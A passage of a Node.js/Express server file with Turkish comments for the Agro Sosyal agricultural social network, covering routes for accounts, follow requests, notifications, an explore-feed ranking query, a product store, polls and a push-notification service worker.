        if (!product) return res.status(404).json({ error: 'Ürün bulunamadı' });
        res.json({ product });
    } catch (error) {
        console.error('Ürün detay hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 51. HESAP KAPAMA ──────────────────────────────────────────────
app.delete('/api/auth/account', authenticateToken, async (req, res) => {
    try {
        const { password } = req.body;
        if (!password) return res.status(400).json({ error: 'Şifre gerekli' });

        const user = await dbGet('SELECT password FROM users WHERE id = $1', [req.user.id]);
        const valid = await bcrypt.compare(password, user.password);
        if (!valid) return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });

        await dbRun('UPDATE users SET "isActive" = FALSE, "updatedAt" = NOW() WHERE id = $1', [req.user.id]);
        await dbRun('UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1', [req.user.id]);

        res.json({ message: 'Hesap kapatıldı' });
    } catch (error) {
        console.error('Hesap silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 52. KULLANICI ÖNERİLERİ ────────────────────────────────────────
app.get('/api/users/suggestions', authenticateToken, async (req, res) => {
    try {
        // Önce ortak bağlantı mantığıyla öner (takip ettiklerinin takip ettikleri)
        const mutual = await dbAll(
            `SELECT DISTINCT u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType",
                    COUNT(DISTINCT f2.id) AS "mutualCount"
             FROM follows f1
             JOIN follows f2 ON f1."followingId" = f2."followerId"
             JOIN users u ON f2."followingId" = u.id
             WHERE f1."followerId" = $1
               AND f2."followingId" != $1
               AND u."isActive" = TRUE
               AND f2."followingId" NOT IN (SELECT "followingId" FROM follows WHERE "followerId" = $1)
               AND f2."followingId" NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
             GROUP BY u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType"
             ORDER BY "mutualCount" DESC
             LIMIT 5`,
            [req.user.id]
        );

        let suggestions = [...mutual];

        // Ortak bağlantı yetmezse rastgele tamamla — kullanıcı ID tabanlı seed ile farklı sıralama
        if (suggestions.length < 10) {
            const needed = 10 - suggestions.length;
            const existingIds = suggestions.map(s => s.id);
            const extra = await dbAll(
                `SELECT id, username, name, "profilePic", "isVerified", "hasFarmerBadge", "userType", 0 AS "mutualCount"
                 FROM users
                 WHERE "isActive" = TRUE AND id != $1
                   AND id NOT IN (SELECT "followingId" FROM follows WHERE "followerId" = $1)
                   AND id NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
                   ${existingIds.length > 0 ? `AND id NOT IN (${existingIds.map((_, i) => `$${i+3}`).join(',')})` : ''}
                 ORDER BY "isVerified" DESC, "hasFarmerBadge" DESC, RANDOM()
                 LIMIT $2`,
                [req.user.id, needed, ...existingIds]
            );
            suggestions = [...suggestions, ...extra];
        }

        res.json({ suggestions });
    } catch (error) {
        console.error('Öneriler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 53. OKUNMAMIŞ MESAJ SAYISI ─────────────────────────────────────
app.get('/api/messages/unread/count', authenticateToken, async (req, res) => {
    try {
        const result = await dbGet(
            'SELECT COUNT(*) as count FROM messages WHERE "recipientId" = $1 AND read = FALSE',
            [req.user.id]
        );
        res.json({ unreadCount: parseInt(result?.count || 0) });
    } catch (error) {
        console.error('Okunmamış sayısı hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 54. BİLDİRİM SİL ──────────────────────────────────────────────
app.delete('/api/notifications/:id', authenticateToken, async (req, res) => {
    try {
        await dbRun('DELETE FROM notifications WHERE id = $1 AND "userId" = $2', [req.params.id, req.user.id]);
        res.json({ message: 'Bildirim silindi' });
    } catch (error) {
        console.error('Bildirim silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 55. TÜM BİLDİRİMLERİ SİL ─────────────────────────────────────
app.delete('/api/notifications', authenticateToken, async (req, res) => {
    try {
        await dbRun('DELETE FROM notifications WHERE "userId" = $1', [req.user.id]);
        res.json({ message: 'Tüm bildirimler silindi' });
    } catch (error) {
        console.error('Bildirim temizleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 56. GİZLİLİK AYARLARI ─────────────────────────────────────────
app.put('/api/users/privacy', authenticateToken, async (req, res) => {
    try {
        const { isPrivate } = req.body;
        await dbRun('UPDATE users SET "isPrivate" = $1, "updatedAt" = NOW() WHERE id = $2', [!!isPrivate, req.user.id]);
        res.json({ message: 'Gizlilik ayarları güncellendi', isPrivate: !!isPrivate });
    } catch (error) {
        console.error('Gizlilik hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 57. KULLANICI ŞİKAYET ET ───────────────────────────────────────
app.post('/api/reports/user', authenticateToken, reportLimiter, async (req, res) => {
    try {
        const { userId, reason, description } = req.body;
        if (!userId || !reason) return res.status(400).json({ error: 'Kullanıcı ID ve neden gerekli' });

        await dbRun(
            `INSERT INTO reports (id, "reporterId", "userId", reason, description, "createdAt")
             VALUES ($1, $2, $3, $4, $5, NOW())`,
            [uuidv4(), req.user.id, userId, reason, description || '']
        );

        res.json({ message: 'Şikayet alındı' });
    } catch (error) {
        console.error('Kullanıcı şikayet hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 58. MESAJ SİL ──────────────────────────────────────────────────
app.delete('/api/messages/:id', authenticateToken, async (req, res) => {
    try {
        const msg = await dbGet('SELECT "senderId" FROM messages WHERE id = $1', [req.params.id]);
        if (!msg) return res.status(404).json({ error: 'Mesaj bulunamadı' });
        if (msg.senderId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        await dbRun('DELETE FROM messages WHERE id = $1', [req.params.id]);
        res.json({ message: 'Mesaj silindi' });
    } catch (error) {
        console.error('Mesaj silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 59. POST DETAYI (v2) ──────────────────────────────────────────
app.get('/api/posts/:id/detail', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u.username,
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $2) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $2) as "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p.id = $1 AND p."isActive" = TRUE`,
            [req.params.id, req.user.id]
        );
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });

        await dbRun('UPDATE posts SET views = views + 1 WHERE id = $1', [req.params.id]);

        res.json({ post });
    } catch (error) {
        console.error('Post detay hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 60. KEŞFET ────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════
// 🔍 KEŞFET ALGORİTMASI v2 — Kişiselleştirilmiş & Sürekli Yenilenen
// ════════════════════════════════════════════════════════════════════
// Algoritma puanlama mantığı:
//   - Taze içerik (son 48 saat):        +40 puan
//   - Orta taze (2-7 gün):              +20 puan
//   - Kullanıcı ilgi alanı eşleşmesi:   +30 puan (hashtag bazlı)
//   - Yüksek etkileşim (viral):         +25 puan (likeCount > 50)
//   - Orta etkileşim:                   +15 puan (likeCount > 10)
//   - Takip edilen birinin beğendiği:   +20 puan
//   - Mavi tik sahibi kullanıcı:        +10 puan
//   - Çiftçi rozeti:                    +10 puan
//   - Random tuz (her kullanıcı farklı görsün): ±15 puan
//   - Daha önce görülmüş post:          -50 puan (aşağıya düşür)
// ════════════════════════════════════════════════════════════════════
app.get('/api/explore', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const pageNum  = Math.max(1, parseInt(page) || 1);
        const limitNum = Math.min(Math.max(parseInt(limit) || 20, 1), 50);

        const userId = req.user.id;

        // Kullanıcıya özgü deterministik tohum (her oturumda aynı sıra ama kullanıcıya göre farklı)
        // Günlük rotasyon: gün değişince karışım yenilenir
        const dayOfYear = Math.floor(Date.now() / (1000 * 60 * 60 * 24));
        const userSeed  = parseInt(userId.replace(/-/g, '').slice(0, 8), 16);
        const dailySeed = (userSeed ^ dayOfYear) % 1000000;

        // 24 saatten eski görülmüş postları temizle
        await dbRun(`DELETE FROM explore_seen_posts WHERE "seenAt" < NOW() - INTERVAL '24 hours'`, []).catch(() => {});

        const posts = await dbAll(
            `WITH
            -- Kullanıcının ilgi hashtag'leri
            user_tags AS (
                SELECT LOWER(interest) as tag FROM user_interests WHERE "userId" = $1
            ),
            -- Takip edilenlerin son 48 saatteki beğenileri
            friend_likes AS (
                SELECT DISTINCT l."postId"
                FROM likes l
                JOIN follows f ON f."followingId" = l."userId"
                WHERE f."followerId" = $1
                  AND l."createdAt" > NOW() - INTERVAL '48 hours'
            ),
            -- Her postun hashtag'leriyle ilgi eşleşmesi
            tag_match AS (
                SELECT ph."postId", COUNT(*) as match_count
                FROM post_hashtags ph
                JOIN hashtags h ON h.id = ph."hashtagId"
                WHERE LOWER(h.tag) IN (SELECT tag FROM user_tags)
                GROUP BY ph."postId"
            ),
            -- Görülmüş postlar
            seen AS (
                SELECT "postId" FROM explore_seen_posts WHERE "userId" = $1
            ),
            -- Puanlama
            scored AS (
                SELECT
                    p.*,
                    u.name,
                    u."profilePic",
                    u."isVerified",
                    u."hasFarmerBadge",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved",
                    -- Taze içerik puanı
                    CASE
                        WHEN p."createdAt" > NOW() - INTERVAL '48 hours' THEN 40
                        WHEN p."createdAt" > NOW() - INTERVAL '7 days'   THEN 20
                        WHEN p."createdAt" > NOW() - INTERVAL '30 days'  THEN 10
                        ELSE 0
                    END
                    -- Etkileşim puanı
                    + CASE
                        WHEN (p."likeCount" + p."commentCount" * 2) > 100 THEN 25
                        WHEN (p."likeCount" + p."commentCount" * 2) > 20  THEN 15
                        WHEN (p."likeCount" + p."commentCount" * 2) > 5   THEN 8
                        ELSE 0
                    END
                    -- İlgi alanı eşleşme puanı
                    + COALESCE((SELECT match_count * 30 FROM tag_match tm WHERE tm."postId" = p.id), 0)
                    -- Takip edilen birinin beğendiği
                    + CASE WHEN p.id IN (SELECT "postId" FROM friend_likes) THEN 20 ELSE 0 END
                    -- Profil güvenilirlik puanı
                    + CASE WHEN u."isVerified" = TRUE THEN 10 ELSE 0 END
                    + CASE WHEN u."hasFarmerBadge" = TRUE THEN 10 ELSE 0 END
                    -- Daha önce görülmüş ceza
                    + CASE WHEN p.id IN (SELECT "postId" FROM seen) THEN -50 ELSE 0 END
                    -- Kullanıcıya özgü random tuz (farklı kullanıcı → farklı sıra)
                    + (((hashtext(p.id::text || $2::text) % 15) + 15) % 15) - 7
                    AS explore_score
                FROM posts p
                JOIN users u ON p."userId" = u.id
                WHERE p."isActive" = TRUE
                  AND u."isActive" = TRUE
                  AND u.id != $1
                  -- Engellenen kullanıcıların postlarını gizle
                  AND u.id NOT IN (
                      SELECT "blockedId" FROM blocks WHERE "blockerId" = $1
                      UNION
                      SELECT "blockerId" FROM blocks WHERE "blockedId" = $1
                  )
            )
            SELECT * FROM scored
            ORDER BY explore_score DESC, "createdAt" DESC
            LIMIT $3 OFFSET $4`,
            [userId, dailySeed, limitNum, (pageNum - 1) * limitNum]
        );

        // Gösterilen postları "görüldü" olarak işaretle (arka planda)
        if (posts.length > 0) {
            const values = posts.map(p => `('${userId}', '${p.id}', NOW())`).join(',');
            dbRun(
                `INSERT INTO explore_seen_posts ("userId", "postId", "seenAt")
                 VALUES ${values}
                 ON CONFLICT ("userId", "postId") DO UPDATE SET "seenAt" = NOW()`,
                []
            ).catch(() => {});
        }

        res.json({ posts: posts.map(formatPost), page: pageNum, hasMore: posts.length === limitNum });
    } catch (error) {
        console.error('Keşfet hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 61. GİRİŞ GEÇMİŞİ ────────────────────────────────────────────
app.get('/api/auth/login-history', authenticateToken, async (req, res) => {
    try {
        const history = await dbAll(
            `SELECT id, ip, country, city, "userAgent", "loginType", "createdAt"
             FROM login_history WHERE "userId" = $1
             ORDER BY "createdAt" DESC LIMIT 20`,
            [req.user.id]
        );
        res.json({ history });
    } catch (error) {
        console.error('Giriş geçmişi hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 62. KULLANICININ ÜRÜNLERİ ──────────────────────────────────────
app.get('/api/users/:userId/products', authenticateToken, async (req, res) => {
    try {
        const products = await dbAll(
            `SELECT * FROM products WHERE "sellerId" = $1 AND "isActive" = TRUE ORDER BY "createdAt" DESC`,
            [req.params.userId]
        );
        res.json({ products });
    } catch (error) {
        console.error('Kullanıcı ürünleri hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 63. ÜRÜN ARA ───────────────────────────────────────────────────
app.get('/api/store/search', authenticateToken, async (req, res) => {
    try {
        const { q, category, minPrice, maxPrice, page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const conditions = ['p."isActive" = TRUE'];
        const params = [];
        let idx = 1;

        if (q) {
            conditions.push(`(LOWER(p.name) LIKE $${idx} OR LOWER(p.description) LIKE $${idx})`);
            params.push(`%${q.toLowerCase()}%`);
            idx++;
        }
        if (category) {
            conditions.push(`p.category = $${idx}`);
            params.push(category);
            idx++;
        }
        if (minPrice) {
            conditions.push(`price >= $${idx}`);
            params.push(parseFloat(minPrice));
            idx++;
        }
        if (maxPrice) {
            conditions.push(`price <= $${idx}`);
            params.push(parseFloat(maxPrice));
            idx++;
        }

        params.push(parseInt(limit));
        params.push(offset);

        const products = await dbAll(
            `SELECT p.*, u.username as "sellerName", u."profilePic" as "sellerProfilePic"
             FROM products p JOIN users u ON p."sellerId" = u.id
             WHERE ${conditions.join(' AND ')}
             ORDER BY p."createdAt" DESC
             LIMIT $${idx} OFFSET $${idx + 1}`,
            params
        );

        res.json({ products });
    } catch (error) {
        console.error('Ürün arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 65. ÇOKLU POST GÖRÜNTÜLEME ────────────────────────────────────
app.post('/api/posts/batch-view', authenticateToken, async (req, res) => {
    try {
        const { postIds } = req.body;
        if (!Array.isArray(postIds) || postIds.length === 0) return res.json({ updated: 0 });

        const placeholders = postIds.map((_, i) => `$${i + 1}`).join(',');
        await pool.query(`UPDATE posts SET views = views + 1 WHERE id IN (${placeholders})`, postIds);
        res.json({ updated: postIds.length });
    } catch (error) {
        console.error('Batch view hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ════════════════════════════════════════════════════════════════════
// 🔒 EKSİK ROTALAR — SQL ENJEKSİYON KORUMALARI DAHİL
//    Tüm sorgular parameterize ($1,$2...) — kullanıcı girdisi asla
//    doğrudan SQL string'e concat edilmez.
// ════════════════════════════════════════════════════════════════════

// ─── EKSİK ROTA 1: TÜM OTURUMLARDAN ÇIKIŞ ──────────────────────────
// Hesap çalınırsa tüm cihazlardan oturumu kapat
app.post('/api/auth/logout-all', authenticateToken, async (req, res) => {
    try {
        const uid = req.user.id;
        // 🔒 Mevcut token'ı blacklist'e ekle
        blacklistToken(req._token);
        // Tüm refresh token'ları geçersiz kıl
        await dbRun(`UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1`, [uid]);
        await dbRun(`UPDATE active_sessions SET "isActive" = FALSE WHERE "userId" = $1`, [uid]);
        await dbRun(`UPDATE users SET "isOnline" = FALSE, "lastSeen" = NOW() WHERE id = $1`, [uid]);
        // Cookie temizle
        res.clearCookie('access_token',  { httpOnly: true, sameSite: 'strict', path: '/' });
        res.clearCookie('refresh_token', { httpOnly: true, sameSite: 'strict', path: '/api/auth/refresh' });
        res.json({ success: true, message: 'Tüm oturumlardan çıkış yapıldı' });
    } catch (error) {
        console.error('Logout-all hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 2: AKTİF OTURUMLAR ────────────────────────────────
// Hangi cihazlardan giriş yapıldığını gösterir
app.get('/api/auth/active-sessions', authenticateToken, async (req, res) => {
    try {
        // Aktif refresh token'ları getir (parameterize, limit cap)
        const sessions = await dbAll(
            `SELECT id, ip, "userAgent", "createdAt", "expiresAt"
             FROM refresh_tokens
             WHERE "userId" = $1 AND "isActive" = TRUE AND "expiresAt" > NOW()
             ORDER BY "createdAt" DESC
             LIMIT 20`,
            [req.user.id]
        );
        res.json({ sessions });
    } catch (error) {
        console.error('Aktif oturumlar hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 3: ORTAK TAKİPÇİLER ───────────────────────────────
// İki kullanıcının ortak takipçilerini döner
// ─── EKSİK ROTA 4: TAKİP İSTEKLERİ LİSTESİ ────────────────────────
// Gizli hesap için bekleyen takip isteklerini getirir
app.get('/api/follow-requests', authenticateToken, async (req, res) => {
    try {
        const requests = await dbAll(
            `SELECT fr.id, fr."createdAt", fr.status,
                    u.id AS "requesterId", u.name AS "requesterName",
                    u.username AS "requesterUsername", u."profilePic" AS "requesterPic",
                    u."isVerified", u."hasFarmerBadge"
             FROM follow_requests fr
             JOIN users u ON fr."requesterId" = u.id
             WHERE fr."targetId" = $1 AND fr.status = 'pending'
             ORDER BY fr."createdAt" DESC
             LIMIT 100`,
            [req.user.id]
        );
        res.json({ requests, count: requests.length });
    } catch (error) {
        console.error('Takip istekleri hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 5: TAKİP İSTEĞİ KABUL ET ──────────────────────────
app.post('/api/follow-requests/:requesterId/accept', authenticateToken, async (req, res) => {
    try {
        const { requesterId } = req.params;
        // UUID doğrula (injection önlemi)
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        if (!uuidRegex.test(requesterId)) return res.status(400).json({ error: 'Geçersiz ID' });

        const request = await dbGet(
            `SELECT * FROM follow_requests
             WHERE "requesterId" = $1 AND "targetId" = $2 AND status = 'pending'`,
            [requesterId, req.user.id]          // $1, $2 → tamamen parameterize
        );
        if (!request) return res.status(404).json({ error: 'İstek bulunamadı' });

        // İsteği kabul et
        await dbRun(
            `UPDATE follow_requests SET status = 'accepted', "respondedAt" = NOW() WHERE id = $1`,
            [request.id]
        );

        // Gerçek takip ilişkisi oluştur (ON CONFLICT ile tekrar girişi önle)
        await dbRun(
            `INSERT INTO follows (id, "followerId", "followingId", "createdAt")
             VALUES ($1, $2, $3, NOW())
             ON CONFLICT ("followerId", "followingId") DO NOTHING`,
            [uuidv4(), requesterId, req.user.id]
        );

        // Bildirim gönder
        await createNotification(
            requesterId, 'follow_accepted',
            `${req.user.username} takip isteğinizi kabul etti`,
            { targetId: req.user.id, targetUsername: req.user.username }
        );

        res.json({ success: true, message: 'Takip isteği kabul edildi' });
    } catch (error) {
        console.error('Takip isteği kabul hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 6: TAKİP İSTEĞİ REDDET ────────────────────────────
app.post('/api/follow-requests/:requesterId/reject', authenticateToken, async (req, res) => {
    try {
        const { requesterId } = req.params;
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        if (!uuidRegex.test(requesterId)) return res.status(400).json({ error: 'Geçersiz ID' });

        await dbRun(
            `UPDATE follow_requests SET status = 'rejected', "respondedAt" = NOW()
             WHERE "requesterId" = $1 AND "targetId" = $2 AND status = 'pending'`,
            [requesterId, req.user.id]          // Tamamen parameterize
        );
        res.json({ success: true, message: 'Takip isteği reddedildi' });
    } catch (error) {
        console.error('Takip isteği reddetme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 7: KULLANICI ENGELİNİ KALDIR (ayrı endpoint) ──────
// Mevcut toggle (/block) ile birlikte kullanılabilir
app.post('/api/users/:id/unblock', authenticateToken, async (req, res) => {
    try {
        const targetId = req.params.id;
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        if (!uuidRegex.test(targetId)) return res.status(400).json({ error: 'Geçersiz ID' });

        // Sadece kendi bloğunu kaldırabilir — "blockerId" = req.user.id ile kısıt
        const result = await dbRun(
            `DELETE FROM blocks WHERE "blockerId" = $1 AND "blockedId" = $2`,
            [req.user.id, targetId]             // $1 = oturum sahibi (tampon)
        );
        if (result.changes === 0) return res.status(404).json({ error: 'Engelleme kaydı bulunamadı' });
        res.json({ success: true, message: 'Engel kaldırıldı', blocked: false });
    } catch (error) {
        console.error('Engel kaldırma hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 8: ANKET SONUÇLARI ─────────────────────────────────
// Oy sayıları + hangi opsiyona kaç kişi oy verdi
app.get('/api/posts/:postId/poll/results', authenticateToken, async (req, res) => {
    try {
        const postId = req.params.postId;
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        if (!uuidRegex.test(postId)) return res.status(400).json({ error: 'Geçersiz gönderi ID' });

        const post = await dbGet(
            `SELECT "pollOptions", "pollQuestion", "userId" FROM posts WHERE id = $1 AND "isPoll" = TRUE`,
            [postId]
        );
        if (!post) return res.status(404).json({ error: 'Anket bulunamadı' });

        // Her seçenek için oy sayısını çek
        const voteCounts = await dbAll(
            `SELECT "optionId", COUNT(*) AS "voteCount"
             FROM poll_votes WHERE "postId" = $1
             GROUP BY "optionId"`,
            [postId]
        );

        const totalVotes = voteCounts.reduce((sum, r) => sum + parseInt(r.voteCount), 0);
        const myVote     = await dbGet(
            `SELECT "optionId" FROM poll_votes WHERE "postId" = $1 AND "userId" = $2`,
            [postId, req.user.id]
        );

        let options = post.pollOptions;
        if (typeof options === 'string') options = JSON.parse(options);

        // Oy sayılarını opsiyonlarla birleştir
        const enriched = (options || []).map(opt => {
            const vc = voteCounts.find(v => parseInt(v.optionId) === opt.id);
            const count = vc ? parseInt(vc.voteCount) : 0;
            return {
                ...opt,
                voteCount : count,
                percentage: totalVotes > 0 ? Math.round((count / totalVotes) * 100) : 0,
            };
        });

        res.json({
            pollQuestion: post.pollQuestion,
            options     : enriched,
            totalVotes,
            myVote      : myVote ? myVote.optionId : null,
            isOwner     : post.userId === req.user.id,
        });
    } catch (error) {
        console.error('Anket sonuçları hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 9: BİLDİRİM AYARLARINI GETİR ───────────────────────
app.get('/api/users/notification-settings', authenticateToken, async (req, res) => {
    try {
        let settings = await dbGet(
            `SELECT ns.likes, ns.comments, ns.follows, ns.messages, u."notifExtra"
             FROM notification_settings ns
             RIGHT JOIN users u ON u.id = ns."userId"
             WHERE u.id = $1`,
            [req.user.id]
        ).catch(() => null);

        // Temel varsayılanlar
        const base = { likes: true, comments: true, follows: true, messages: true, replies: true, mentions: true, quotes: true, reposts: true, newFollower: true, followRequest: true, fromNonFollowing: true, fromNonFollowers: false };
        if (!settings) { settings = base; }

        // notifExtra JSON'dan ek alanları merge et
        let extra = {};
        if (settings.notifExtra) {
            try { extra = JSON.parse(settings.notifExtra); } catch(_) {}
        }
        const full = { ...base, likes: settings.likes ?? true, comments: settings.comments ?? true, follows: settings.follows ?? true, messages: settings.messages ?? true, ...extra };
        res.json({ settings: full });
    } catch (error) {
        console.error('Bildirim ayarları getirme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── EKSİK ROTA 10: PROFİL FOTOĞRAFI SİL ───────────────────────────
// Kullanıcı kendi profil/kapak fotoğrafını kaldırır
app.delete('/api/users/profile-pic', authenticateToken, async (req, res) => {
    try {
        const { type = 'profile' } = req.query;
        // type değerini whitelist ile doğrula — asla SQL'e concat etme
        const allowed = ['profile', 'cover'];
        if (!allowed.includes(type)) return res.status(400).json({ error: 'Geçersiz tip: profile veya cover olmalı' });

        const column = type === 'profile' ? '"profilePic"' : '"coverPic"';

        // Mevcut dosyayı al (silmek için)
        const user = await dbGet(`SELECT ${column} AS pic FROM users WHERE id = $1`, [req.user.id]);
        if (user?.pic) {
            // Güvenli path join — sadece tanımlı dizin altında
            const picPath = path.join(__dirname, user.pic.replace(/^\//, ''));
            if (picPath.startsWith(uploadsDir)) {    // Path traversal önlemi
                fs.unlink(picPath).catch(() => {});
            }
        }

        // Parameterize UPDATE — column adı whitelist'ten seçildi, injection imkansız
        await dbRun(`UPDATE users SET ${column} = NULL, "updatedAt" = NOW() WHERE id = $1`, [req.user.id]);

        res.json({ success: true, message: `${type === 'profile' ? 'Profil' : 'Kapak'} fotoğrafı silindi` });
    } catch (error) {
        console.error('Profil fotoğrafı silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ════════════════════════════════════════════════════════════════════

const agrolinkDir = path.join(__dirname, 'public', 'agrolink');
if (fssync.existsSync(agrolinkDir)) {
    app.use('/agrolink', express.static(agrolinkDir, { maxAge: '1d', dotfiles: 'deny' }));
}
app.get('/agrolink', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'agrolink', 'index.html');
    if (fssync.existsSync(htmlPath)) {
        res.sendFile(htmlPath);
    } else {
        res.status(404).json({ error: 'AgroLink uygulaması bulunamadı' });
    }
});

// ── React Router için SPA catch-all: /agrolink/* ──────────────────────────
// Vite build çıktısı public/agrolink/ klasörüne kopyalanmalıdır.
// Tüm alt rotalar (/agrolink/feed, /agrolink/profile vb.) index.html'e yönlendirilir.
app.get('/agrolink/*', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'agrolink', 'index.html');
    if (fssync.existsSync(htmlPath)) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Cache-Control', 'no-cache');
        res.sendFile(htmlPath);
    } else {
        res.status(404).json({ error: 'AgroLink uygulaması bulunamadı. public/agrolink/index.html ekleyin.' });
    }
});

// ─── SERVICE WORKER (/sw.js) ─────────────────────────────────────────
app.get('/sw.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Service-Worker-Allowed', '/');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(`
/* Agrolink Service Worker v1.0 */
const CACHE_NAME = 'agrolink-v1';
const APP_SHELL = ['/'];

self.addEventListener('install', (event) => {
    console.log('[SW] Install');
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    console.log('[SW] Activate');
    event.waitUntil(clients.claim());
});

self.addEventListener('push', (event) => {
    const data = event.data ? event.data.json() : {};
    const title = data.title || 'Agrolink';
    const options = {
        body: data.body || '',
        icon: data.icon || '/agro.png',
        badge: '/agro.png',
        tag: 'agrolink-' + Date.now(),
        renotify: true,
        vibrate: [200, 100, 200],
        data: { url: data.url || '/' }
    };
    event.waitUntil(self.registration.showNotification(title, options));
});

self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    const url = event.notification.data?.url || '/';
    event.waitUntil(clients.openWindow(url));
});

self.addEventListener('fetch', (event) => {
    // Sadece GET isteklerini ele al, API isteklerini pas geç
    if (event.request.method !== 'GET') return;
    if (event.request.url.includes('/api/')) return;
    // Diğer istekler için network-first
    event.respondWith(fetch(event.request).catch(() => caches.match(event.request)));
});
    `);
});

const publicDir = path.join(__dirname, 'public');
if (fssync.existsSync(publicDir)) {
    app.use(express.static(publicDir, { maxAge: '1d', index: false, dotfiles: 'deny' }));
}

// ═══════════════════════════════════════════════════════
// 📄 HAKKIMIZDA — /hakkimizda
// ═══════════════════════════════════════════════════════
app.get('/hakkimizda', (req, res) => {
    const customPath = path.join(__dirname, 'public', 'hakkimizda.html');
    if (fssync.existsSync(customPath)) return res.sendFile(customPath);
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hakkimizda | Agro Sosyal</title>
<meta name="description" content="Agro Sosyal, ciftciler ve tarim sektoru icin gelistirilmis yerli sosyal medya platformu.">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${DOMAIN}/hakkimizda">
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"Agro Sosyal","alternateName":["agrososyal","AgroSosyal"],"url":"${DOMAIN}","logo":{"@type":"ImageObject","url":"${DOMAIN}/agro.png"},"description":"Ciftciler ve tarim sektoru icin gelistirilmis yerli sosyal medya platformu.","foundingDate":"2024","areaServed":{"@type":"Country","name":"Turkiye"},"inLanguage":"tr-TR","sameAs":["${DOMAIN}","${DOMAIN}/hakkimizda","https://www.instagram.com/agrososyal_official"]}<\/script>
